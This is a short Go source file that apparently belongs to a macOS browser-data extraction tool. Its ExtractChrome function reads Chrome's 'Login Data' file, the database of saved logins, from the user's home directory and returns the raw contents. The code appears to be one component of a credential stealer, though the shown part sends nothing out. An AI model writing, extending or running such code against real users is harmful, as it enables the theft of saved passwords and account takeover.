package darwin

import (
"os"
"path/filepath"
)

type DarwinBrowser struct{}

func NewDarwinBrowser() *DarwinBrowser {
return &DarwinBrowser{}
}

func (b *DarwinBrowser) ExtractChrome() (string, error) {
path := filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Google", "Chrome", "Default", "Login Data")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}
